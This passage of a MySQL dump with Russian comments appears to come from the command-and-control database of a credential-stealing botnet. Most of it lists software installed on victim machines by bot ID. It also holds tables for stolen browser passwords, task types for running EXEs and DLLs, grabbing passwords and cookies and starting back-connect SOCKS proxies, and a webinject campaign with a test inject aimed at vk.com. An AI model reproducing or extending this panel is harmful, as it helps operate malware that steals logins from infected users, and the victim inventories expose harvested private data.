(372, 27, 'Update for Windows 10 for x64-based Systems (KB4023057)', 'Microsoft Corporation'),
(373, 27, 'Corel Update Manager', 'Corel corporation'),
(374, 27, 'CorelDRAW Graphics Suite 2018 - VBA (x64)', 'Corel Corporation'),
(375, 27, 'Microsoft Visual Basic for Applications 7.1 (x64)', 'Microsoft Corporation'),
(376, 27, 'Office 16 Click-to-Run Licensing Component', 'Microsoft Corporation'),
(377, 27, 'Office 16 Click-to-Run Extensibility Component 64-bit Registration', 'Microsoft Corporation'),
(378, 27, 'Microsoft Visual Basic for Applications 7.1 (x64) English', 'Microsoft Corporation'),
(379, 27, 'Microsoft Visual Basic for Applications 7.1 (x64) Portuguese (Brazil)', 'Microsoft Corporation'),
(380, 27, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005', 'Microsoft Corporation'),
(381, 27, 'CorelDRAW Graphics Suite 2018 - Filters (x64)', 'Corel Corporation'),
(382, 27, 'CorelDRAW Graphics Suite 2018 - Workspaces (x64)', 'Corel Corporation'),
(383, 27, 'Microsoft Application Error Reporting', 'Microsoft Corporation'),
(384, 27, 'Microsoft Update Health Tools', 'Microsoft Corporation'),
(385, 27, 'CorelDRAW Graphics Suite 2018 - IPM (x64)', 'Corel Corporation'),
(386, 27, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005', 'Microsoft Corporation'),
(387, 27, 'Update for Windows 10 for x64-based Systems (KB4480730)', 'Microsoft Corporation'),
(388, 27, 'CorelDRAW Graphics Suite 2018 - Connect (x64)', 'Corel Corporation'),
(389, 27, 'Corel Graphics - Windows Shell Extension 32 Bit Keys', 'Corel Corporation'),
(390, 27, 'Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810', 'Microsoft Corporation'),
(391, 27, 'CorelDRAW Graphics Suite 2018 - Common (x64)', 'Corel Corporation'),
(392, 27, 'CorelDRAW Graphics Suite 2018 - PHOTO-PAINT (x64)', 'Corel Corporation'),
(393, 27, 'CorelDRAW Graphics Suite 2018 - Setup Files (x64)', 'Corel Corporation'),
(394, 27, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030', 'Microsoft Corporation'),
(395, 27, 'CorelDRAW Graphics Suite 2018 - Redist (x64)', 'Corel Corporation'),
(396, 27, 'CorelDRAW Graphics Suite 2018 - Font Manager (x64)', 'Corel Corporation'),
(397, 27, 'UpdateAssistant', 'Unknown'),
(398, 27, 'CorelDRAW Graphics Suite 2018 - Writing Tools (x64)', ' Corel Corporation'),
(399, 28, 'Unknown', 'Conexant Systems'),
(400, 28, 'Conexant HD Audio', 'Conexant'),
(401, 28, 'Microsoft Office Professional Plus 2019 - en-us', 'Microsoft Corporation'),
(402, 28, 'Microsoft Office Professional Plus 2019 - th-th', 'Microsoft Corporation'),
(403, 28, 'Synaptics Pointing Device Driver', 'Synaptics Incorporated'),
(404, 28, 'Vulkan Run Time Libraries 1.0.26.0', 'LunarG, Inc.'),
(405, 28, 'WinRAR 5.80 (64-bit)', 'win.rar GmbH'),
(406, 28, 'Microsoft Visual C++ 2005 Redistributable (x64)', 'Microsoft Corporation'),
(407, 28, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(408, 28, 'Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810', 'Microsoft Corporation'),
(409, 28, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030', 'Microsoft Corporation'),
(410, 28, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17', 'Microsoft Corporation'),
(411, 28, 'Office 16 Click-to-Run Licensing Component', 'Microsoft Corporation'),
(412, 28, 'Office 16 Click-to-Run Extensibility Component', 'Microsoft Corporation'),
(413, 28, 'Office 16 Click-to-Run Localization Component', 'Microsoft Corporation'),
(414, 28, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005', 'Microsoft Corporation'),
(415, 28, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005', 'Microsoft Corporation'),
(416, 28, 'Dolby Digital Plus Advanced Audio', 'Dolby Laboratories Inc'),
(417, 28, 'NVIDIA Control Panel 376.54', 'NVIDIA Corporation'),
(418, 28, 'NVIDIA Graphics Driver 376.54', 'NVIDIA Corporation'),
(419, 28, 'NVIDIA Install Application', 'NVIDIA Corporation'),
(420, 28, 'NVIDIA Display Container', 'NVIDIA Corporation'),
(421, 28, 'NVIDIA Display Container LS', 'NVIDIA Corporation'),
(422, 28, 'Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810', 'Microsoft Corporation'),
(423, 28, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030', 'Microsoft Corporation'),
(424, 32, 'DAEMON Tools Ultra', 'Disc Soft Ltd'),
(425, 32, 'Microsoft Visual J# 2.0 Redistributable Package - SE (x64)', 'Microsoft Corporation'),
(426, 32, 'Horizon Chase Turbo - Summer Vibes', 'TinyISO'),
(427, 32, 'VLC media player', 'VideoLAN'),
(428, 32, 'WinRAR 5.91 beta 1 (64-bit)', 'win.rar GmbH'),
(429, 32, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664', 'Microsoft Corporation'),
(430, 32, 'Microsoft .NET Framework 4.8', 'Microsoft Corporation'),
(431, 32, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(432, 32, 'Allgemeine Runtime Files (x86)', 'Sereby Corporation'),
(433, 32, 'Microsoft .NET Framework 4.8 (PTB)', 'Microsoft Corporation'),
(434, 32, 'Java 8 Update 251 (64-bit)', 'Oracle Corporation'),
(435, 32, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61135', 'Microsoft Corporation'),
(436, 32, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664', 'Microsoft Corporation'),
(437, 32, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.7523', 'Microsoft Corporation'),
(438, 32, 'Microsoft Visual C++ 2019 X64 Additional Runtime - 14.25.28508', 'Microsoft Corporation'),
(439, 32, 'Microsoft Silverlight', 'Microsoft Corporation'),
(440, 32, 'Microsoft Visual C++ 2005 Redistributable (x64)', 'Microsoft Corporation'),
(441, 32, 'NVIDIA Ansel', 'Unknown'),
(442, 32, 'Painel de controle da NVIDIA 451.67', 'NVIDIA Corporation'),
(443, 32, 'NVIDIA GeForce Experience 3.20.4.14', 'NVIDIA Corporation'),
(444, 32, 'NVIDIA Software do sistema PhysX 9.19.0218', 'NVIDIA Corporation'),
(445, 32, 'AtualizaÃ§Ãµes da NVIDIA 38.0.5.0', 'NVIDIA Corporation'),
(446, 32, 'NVIDIA SHIELD Streaming', 'NVIDIA Corporation'),
(447, 32, 'NVIDIA Driver de Ã¡udio HD 1.3.38.34', 'NVIDIA Corporation'),
(448, 32, 'NVIDIA Install Application', 'NVIDIA Corporation'),
(449, 32, 'NVIDIA ABHub', 'Unknown'),
(450, 32, 'NVIDIA Backend', 'Unknown'),
(451, 32, 'NVIDIA Container', 'Unknown'),
(452, 32, 'NVIDIA TelemetryApi helper for NvContainer', 'NVIDIA Corporation'),
(453, 32, 'NVIDIA LocalSystem Container', 'NVIDIA Corporation'),
(454, 32, 'NVIDIA Message Bus for NvContainer', 'NVIDIA Corporation'),
(455, 32, 'NVAPI Monitor plugin for NvContainer', 'NVIDIA Corporation'),
(456, 32, 'NVIDIA NetworkService Container', 'NVIDIA Corporation'),
(457, 32, 'NVIDIA Session Container', 'NVIDIA Corporation'),
(458, 32, 'NVIDIA User Container', 'NVIDIA Corporation'),
(459, 32, 'NVIDIA Display Container', 'NVIDIA Corporation'),
(460, 32, 'NVIDIA Display Container LS', 'NVIDIA Corporation'),
(461, 32, 'NVIDIA Display Watchdog Plugin', 'NVIDIA Corporation'),
(462, 32, 'NVIDIA Display Session Container', 'NVIDIA Corporation'),
(463, 32, 'NvModuleTracker', 'Unknown'),
(464, 32, 'NVIDIA NodeJS', 'Unknown'),
(465, 32, 'NVIDIA Watchdog Plugin for NvContainer', 'NVIDIA Corporation'),
(466, 32, 'NVIDIA Telemetry Client', 'NVIDIA Corporation'),
(467, 32, 'NVIDIA Virtual Host Controller', 'NVIDIA Corporation'),
(468, 32, 'Nvidia Share', 'Unknown'),
(469, 32, 'NVIDIA ShadowPlay 3.20.4.14', 'NVIDIA Corporation'),
(470, 32, 'NVIDIA SHIELD Wireless Controller Driver', 'NVIDIA Corporation'),
(471, 32, 'NVIDIA Update Core', 'NVIDIA Corporation'),
(472, 32, 'NVIDIA Virtual Audio 4.13.0.0', 'NVIDIA Corporation'),
(473, 32, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61135', 'Microsoft Corporation'),
(474, 32, 'Microsoft Xbox 360 Accessories 1.2', 'Microsoft'),
(475, 32, 'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.25.28508', 'Microsoft Corporation'),
(476, 32, 'Epic Games Launcher Prerequisites (x64)', 'Epic Games, Inc.'),
(477, 31, '7-Zip 19.00 (x64)', 'Igor Pavlov'),
(478, 31, 'Clownfish Voice Changer', 'Unknown'),
(479, 31, 'Riot Vanguard', 'Unknown'),
(480, 31, 'Counter-Strike: Global Offensive', 'Valve'),
(481, 31, 'Driver Booster 5 for Steam', 'IObit'),
(482, 31, 'WinRAR 5.91 (64-bit)', 'win.rar GmbH'),
(483, 31, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664', 'Microsoft Corporation'),
(484, 31, 'Microsoft Visual C++ 2005 Redistributable (x64)', 'Microsoft Corporation'),
(485, 31, 'FACEIT Anti-Cheat', 'FACEIT LTD'),
(486, 31, 'Quick Driver Updater', 'Unknown'),
(487, 31, 'Microsoft Visual C++ 2019 X64 Additional Runtime - 14.27.29112', 'Microsoft Corporation'),
(488, 31, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(489, 31, 'Java 8 Update 261 (64-bit)', 'Oracle Corporation'),
(490, 31, 'Update for Windows 10 for x64-based Systems (KB4023057)', 'Microsoft Corporation'),
(491, 31, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61135', 'Microsoft Corporation'),
(492, 31, 'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.27.29112', 'Microsoft Corporation'),
(493, 31, 'Update for Windows 10 for x64-based Systems (KB4480730)', 'Microsoft Corporation'),
(494, 31, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664', 'Microsoft Corporation'),
(495, 31, 'Bonjour', 'Unknown'),
(496, 31, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.7523', 'Microsoft Corporation'),
(497, 31, 'Epic Games Launcher Prerequisites (x64)', 'Epic Games, Inc.'),
(498, 31, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17', 'Microsoft Corporation'),
(499, 31, 'Microsoft Silverlight', 'Microsoft Corporation'),
(500, 31, 'Microsoft Office Office 64-bit Components 2010', 'Microsoft Corporation'),
(501, 31, 'Microsoft Office Shared 64-bit MUI (English) 2010', 'Microsoft Corporation'),
(502, 31, 'Microsoft Office Shared 64-bit Setup Metadata MUI (English) 2010', 'Microsoft Corporation'),
(503, 31, 'Intel(R) Computing Improvement Program', 'Intel Corporation'),
(504, 31, 'Microsoft Visual J# 2.0 Redistributable Package - SE (x64)', 'Microsoft Corporation'),
(505, 31, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61135', 'Microsoft Corporation'),
(506, 31, 'VEGAS Pro 17.0', 'VEGAS'),
(507, 31, 'MSVCRT Redists', 'Unknown'),
(508, 31, 'UpdateAssistant', 'Unknown'),
(509, 30, 'Windows Driver Package - Intel Corporation (iaStorA) SCSIAdapter  (09/26/2016 15.2.1.1028)', 'Intel Corporation'),
(510, 30, 'Windows Driver Package - Cypress Semiconductor Corporation (CyUcmClient_Device) UCMCLIENT  (10/20/2016 1.1.0.19)', 'Cypress Semiconductor Corporation'),
(511, 30, 'Windows Driver Package - SAMSUNG Electronics Co., Ltd.  (WinUSB) AndroidUsbDeviceClass  (12/02/2015 2.12.1.0)', 'SAMSUNG Electronics Co., Ltd. '),
(512, 30, 'PlanSwift Professional10.2', 'PlanSwift Software LLC'),
(513, 30, 'Windows Driver Package - SAMSUNG Electronics Co., Ltd.  (dg_ssudbus) USB  (12/02/2015 2.12.1.0)', 'SAMSUNG Electronics Co., Ltd. '),
(514, 30, 'Windows Driver Package - SAMSUNG Electronics Co., Ltd.  (ssudmdm) Modem  (12/02/2015 2.12.1.0)', 'SAMSUNG Electronics Co., Ltd. '),
(515, 30, 'AMD Software', 'Unknown'),
(516, 30, 'Autodesk AutoCAD MEP 2018 - English', 'Autodesk'),
(517, 30, 'Autodesk AutoCAD MEP 2019 - English', 'Autodesk'),
(518, 30, 'Autodesk ReCap', 'Autodesk'),
(519, 30, 'Autodesk ReCap Photo', 'Autodesk'),
(520, 30, 'Autodesk Revit 2016', 'Autodesk'),
(521, 30, 'Autodesk Revit Content Libraries 2016', 'Autodesk'),
(522, 30, 'Windows Driver Package - Google, Inc. (WinUSB) AndroidUsbDeviceClass  (08/27/2012 7.0.0000.00004)', 'Google, Inc.'),
(523, 30, 'Windows Driver Package - Cypress (CYUSB3) USB  (08/19/2015 1.2.3.14)', 'Cypress'),
(524, 30, 'Canon Generic Plus PCL6 Printer Driver Uninstaller', 'Canon Inc.'),
(525, 30, 'DWG TrueView 2013', 'Autodesk'),
(526, 30, 'KONICA MINOLTA Universal PCL', 'KONICA MINOLTA'),
(527, 30, 'McAfee Security Scan Plus', 'McAfee, LLC'),
(528, 30, 'Microsoft Office Professional 2016 - en-us', 'Microsoft Corporation'),
(529, 30, 'Intel(R) Network Connections Drivers', 'Intel'),
(530, 30, 'Vulkan Run Time Libraries 1.0.24.0', 'LunarG, Inc.'),
(531, 30, 'Vulkan Run Time Libraries 1.0.51.0', 'LunarG, Inc.'),
(532, 30, 'Vulkan Run Time Libraries 1.0.61.0', 'LunarG, Inc.'),
(533, 30, 'Vulkan Run Time Libraries 1.0.65.1', 'LunarG, Inc.'),
(534, 30, 'AMD Settings', 'Unknown'),
(535, 30, 'Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.14.26429', 'Microsoft Corporation'),
(536, 30, 'CamStudio 2.7.4', 'Unknown'),
(537, 30, 'Microsoft Visual C++ 2005 Redistributable (x64)', 'Microsoft Corporation'),
(538, 30, 'Catalyst Control Center Next Localization KO', 'Advanced Micro Devices, Inc.'),
(539, 30, 'Intel(R) Rapid Storage Technology', 'Intel Corporation'),
(540, 30, 'Intel(R) Management Engine Components', 'Intel Corporation'),
(541, 30, 'Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219', 'Microsoft Corporation'),
(542, 30, 'Catalyst Control Center Next Localization HU', 'Advanced Micro Devices, Inc.'),
(543, 30, 'Catalyst Control Center Next Localization FI', 'Advanced Micro Devices, Inc.'),
(544, 30, 'Catalyst Control Center Next Localization FR', 'Advanced Micro Devices, Inc.'),
(545, 30, 'Catalyst Control Center Next Localization TH', 'Advanced Micro Devices, Inc.'),
(546, 30, 'AutoCAD 2018', 'Autodesk'),
(547, 30, 'AutoCAD 2018 Language Pack - English', 'Autodesk'),
(548, 30, 'AutoCAD Architecture 2018 Core', 'Autodesk'),
(549, 30, 'AutoCAD Architecture 2018 Shared', 'Autodesk'),
(550, 30, 'ACA & MEP 2018 Object Enabler', 'Autodesk'),
(551, 30, 'AutoCAD Architecture 2018 Language Core - English', 'Autodesk'),
(552, 30, 'AutoCAD Architecture 2018 Language Shared - English', 'Autodesk'),
(553, 30, 'AutoCAD MEP 2018 Core', 'Autodesk'),
(554, 30, 'AutoCAD MEP 2018', 'Autodesk'),
(555, 30, 'AutoCAD MEP 2018 Language Core - English', 'Autodesk'),
(556, 30, 'AutoCAD MEP 2018 - English', 'Autodesk'),
(557, 30, 'AutoCAD 2019', 'Autodesk'),
(558, 30, 'AutoCAD 2019 Language Pack - English', 'Autodesk'),
(559, 30, 'AutoCAD Architecture 2019 Core', 'Autodesk'),
(560, 30, 'AutoCAD Architecture 2019 Shared', 'Autodesk'),
(561, 30, 'ACA & MEP 2019 Object Enabler', 'Autodesk'),
(562, 30, 'AutoCAD Architecture 2019 Language Core - English', 'Autodesk'),
(563, 30, 'AutoCAD Architecture 2019 Language Shared - English', 'Autodesk'),
(564, 30, 'AutoCAD MEP 2019 Core', 'Autodesk'),
(565, 30, 'AutoCAD MEP 2019', 'Autodesk'),
(566, 30, 'AutoCAD MEP 2019 Language Core - English', 'Autodesk'),
(567, 30, 'AutoCAD MEP 2019 - English', 'Autodesk'),
(568, 30, 'Microsoft .NET Core Host - 2.0.3 (x64)', 'Microsoft Corporation'),
(569, 30, 'Maxx Audio Installer (x64)', 'Waves Audio Ltd.'),
(570, 30, 'Update for Windows 10 for x64-based Systems (KB4023057)', 'Microsoft Corporation'),
(571, 30, 'Autodesk License Service (x64) - 5.1.4', 'Autodesk'),
(572, 30, 'Catalyst Control Center Next Localization CS', 'Advanced Micro Devices, Inc.'),
(573, 30, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030', 'Microsoft Corporation'),
(574, 30, 'Apple Mobile Device Support', 'Apple Inc.'),
(575, 30, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.4148', 'Microsoft Corporation'),
(576, 30, 'Catalyst Control Center Next Localization DA', 'Advanced Micro Devices, Inc.'),
(577, 30, 'Catalyst Control Center Next Localization RU', 'Advanced Micro Devices, Inc.'),
(578, 30, 'Autodesk Workflows 2016', 'Autodesk, Inc.'),
(579, 30, 'Bonjour', 'Unknown'),
(580, 30, 'Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161', 'Microsoft Corporation'),
(581, 30, 'Qualcomm Atheros Bluetooth Installer (64)', 'Qualcomm Atheros'),
(582, 30, 'AMD WVR64', 'Unknown'),
(583, 30, 'AMD Settings - Branding', 'Unknown'),
(584, 30, 'Revit 2016', 'Autodesk'),
(585, 30, 'IntelÂ® Trusted Connect Service Client', 'Intel Corporation'),
(586, 30, 'Microsoft .NET Core Host FX Resolver - 2.0.3 (x64)', 'Microsoft Corporation'),
(587, 30, 'AMD Problem Report Wizard', 'Unknown'),
(588, 30, 'Intel(R) Chipset Device Software', 'Intel Corporation'),
(589, 30, 'Catalyst Control Center Next Localization TR', 'Advanced Micro Devices, Inc.'),
(590, 30, 'Apple Application Support (64-bit)', 'Apple Inc.'),
(591, 30, 'KMSpico', 'Unknown'),
(592, 30, 'Office 16 Click-to-Run Licensing Component', 'Microsoft Corporation'),
(593, 30, 'Office 16 Click-to-Run Extensibility Component 64-bit Registration', 'Microsoft Corporation'),
(594, 30, 'Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005', 'Microsoft Corporation'),
(595, 30, 'Revit Content Libraries 2016', 'Autodesk'),
(596, 30, 'Catalyst Control Center Next Localization ES', 'Advanced Micro Devices, Inc.'),
(597, 30, 'Intel(R) Serial IO', 'Intel Corporation'),
(598, 30, 'Microsoft .NET Core SDK - 2.0.3 (x64)', 'Microsoft Corporation'),
(599, 30, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.50727', 'Microsoft Corporation'),
(600, 30, 'Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005', 'Microsoft Corporation'),
(601, 30, 'Catalyst Control Center Next Localization SV', 'Advanced Micro Devices, Inc.'),
(602, 30, 'Catalyst Control Center Next Localization IT', 'Advanced Micro Devices, Inc.'),
(603, 30, 'Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.50727', 'Microsoft Corporation'),
(604, 30, 'Microsoft Visual C++ 2017 x64 Additional Runtime - 14.14.26429', 'Microsoft Corporation'),
(605, 30, 'Catalyst Control Center Next Localization CHT', 'Advanced Micro Devices, Inc.'),
(606, 30, 'A360 Desktop', 'Autodesk'),
(607, 30, 'Microsoft VC++ redistributables repacked.', 'Intel Corporation'),
(608, 30, 'Autodesk BIM 360 Revit 2016 Add-in 64 bit', 'Autodesk'),
(609, 30, 'Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030', 'Microsoft Corporation'),
(610, 30, 'Microsoft ASP.NET Core 2.0.3 Runtime Package Store (x64)', 'Microsoft Corporation'),
(611, 30, 'Samsung USB Driver for Mobile Phones', 'Samsung Electronics Co., Ltd.'),
(612, 30, 'Catalyst Control Center Next Localization DE', 'Advanced Micro Devices, Inc.'),
(613, 30, 'AutoCAD MEP 2019 - DIALux Plug-in on AutoCAD MEP 2019 - English - English (United States)', 'Autodesk, Inc.'),
(614, 30, 'Catalyst Control Center Next Localization EL', 'Advanced Micro Devices, Inc.'),
(615, 30, 'Catalyst Control Center Next Localization NO', 'Advanced Micro Devices, Inc.'),
(616, 30, 'Catalyst Control Center Next Localization NL', 'Advanced Micro Devices, Inc.'),
(617, 30, 'Catalyst Control Center Next Localization BR', 'Advanced Micro Devices, Inc.'),
(618, 30, 'iTunes', 'Unknown'),
(619, 30, 'Catalyst Control Center Next Localization CHS', 'Advanced Micro Devices, Inc.'),
(620, 30, 'Catalyst Control Center Next Localization JA', 'Advanced Micro Devices, Inc.'),
(621, 30, 'Microsoft .NET Core Runtime - 2.0.3 (x64)', 'Microsoft Corporation'),
(622, 30, 'Autodesk License Service (x64) - 7.1.4', 'Autodesk'),
(623, 30, 'Google Earth Pro', 'Google'),
(624, 30, 'Catalyst Control Center Next Localization PL', 'Advanced Micro Devices, Inc.');

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE `settings` (
  `id` int(255) NOT NULL,
  `knock` int(10) NOT NULL,
  `dead` int(10) NOT NULL,
  `gate_status` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`id`, `knock`, `dead`, `gate_status`) VALUES
(1, 5, 7, 1);

-- --------------------------------------------------------

--
-- Структура таблицы `stealer_passwords`
--

CREATE TABLE `stealer_passwords` (
  `id` int(11) NOT NULL,
  `bot_id` int(11) NOT NULL,
  `service` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `login` varchar(100) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `password` varchar(100) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `browser` text COLLATE utf8mb4_unicode_520_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `taskslog`
--

CREATE TABLE `taskslog` (
  `id` int(11) NOT NULL,
  `task_id` int(11) DEFAULT NULL,
  `bot_id` int(11) NOT NULL,
  `status` int(11) UNSIGNED DEFAULT NULL,
  `is_completed` int(2) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `tasks_types`
--

CREATE TABLE `tasks_types` (
  `id` int(11) NOT NULL,
  `type_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `type_identify` int(5) NOT NULL,
  `context_pattern` text COLLATE utf8mb4_unicode_520_ci,
  `module_id` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `tasks_types`
--

INSERT INTO `tasks_types` (`id`, `type_name`, `type_identify`, `context_pattern`, `module_id`) VALUES
(1, 'CORE_EXECUTE_EXE', 1, NULL, 0),
(2, 'CORE_EXECUTE_DLL', 2, NULL, 0),
(3, 'CORE_UPDATE', 3, NULL, 0),
(4, 'CORE_UNINSTALL', 4, NULL, 0),
(5, 'CORE_RUNDLL', 5, NULL, 0),
(6, 'CORE_GET_SOFTWARE', 6, NULL, 0),
(7, 'CORE_GET_ANTIVIRUS', 7, NULL, 0),
(8, 'CORE_GET_FIREWALL', 8, NULL, 0),
(9, 'CORE_SCREENSHOT', 9, NULL, 0),
(10, 'CORE_GET_SYSTEM_INFO', 10, NULL, 0),
(11, 'NETVIEW_GET_INFO', 11, NULL, 7),
(12, 'SOFTWAREGRABBER_GET_PASSWORDS', 12, NULL, 4),
(13, 'SOFTWAREGRABBER_GET_COOKIES', 13, NULL, 4),
(14, 'SOFTWAREGRABBER_DELETE_COOKIES', 14, NULL, 4),
(15, 'BACKSOCKS_START', 15, NULL, 21);

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

CREATE TABLE `users` (
  `id` int(255) NOT NULL,
  `username` varchar(50) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `password` varchar(300) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `privileges` varchar(300) COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `status` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `privileges`, `status`) VALUES
(1, 'admin', '2afeb17bb390590dd930b95946dc20299e39c68da913c6b18de6d30428c5d6e7', 'admin', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_campaigns`
--

CREATE TABLE `webinjects_campaigns` (
  `id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `botids` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `countries` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `group_id` int(11) DEFAULT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `webinjects_campaigns`
--

INSERT INTO `webinjects_campaigns` (`id`, `name`, `description`, `botids`, `countries`, `group_id`, `status`) VALUES
(1, 'test camp', 'test', '0', '0', 0, 1);

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_campaigns_injects`
--

CREATE TABLE `webinjects_campaigns_injects` (
  `id` int(11) NOT NULL,
  `campaign_id` int(11) NOT NULL,
  `inject_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `webinjects_campaigns_injects`
--

INSERT INTO `webinjects_campaigns_injects` (`id`, `campaign_id`, `inject_id`) VALUES
(2, 1, 2);

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_campaigns_logs`
--

CREATE TABLE `webinjects_campaigns_logs` (
  `id` int(11) NOT NULL,
  `campaign_id` int(11) NOT NULL,
  `hwid` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_groups`
--

CREATE TABLE `webinjects_groups` (
  `id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_groups_injects`
--

CREATE TABLE `webinjects_groups_injects` (
  `id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `inject_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `webinjects_injects`
--

CREATE TABLE `webinjects_injects` (
  `id` int(11) NOT NULL,
  `name` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `source` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `status` tinyint(4) DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `webinjects_injects`
--

INSERT INTO `webinjects_injects` (`id`, `name`, `description`, `source`, `status`) VALUES
(2, 'test', 'test', 'set_url *vk.com* GP\n\ndata_before\n<*head*>\ndata_end\ndata_inject\n<script>alert(\"test123\")</script>\ndata_end\ndata_after\ndata_end', 1);

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `general_settings`
--
ALTER TABLE `general_settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `http_grabber_settings`
--
ALTER TABLE `http_grabber_settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `layers`
--
ALTER TABLE `layers`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `main_tasks`
--
ALTER TABLE `main_tasks`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `modules`
--
ALTER TABLE `modules`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `plogs`
--
ALTER TABLE `plogs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `reports_antivirus`
--
ALTER TABLE `reports_antivirus`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
-- Индексы таблицы `reports_firewall`
--
ALTER TABLE `reports_firewall`
  ADD PRIMARY KEY (`id`),
  ADD KEY `bot_id` (`bot_id`);

--
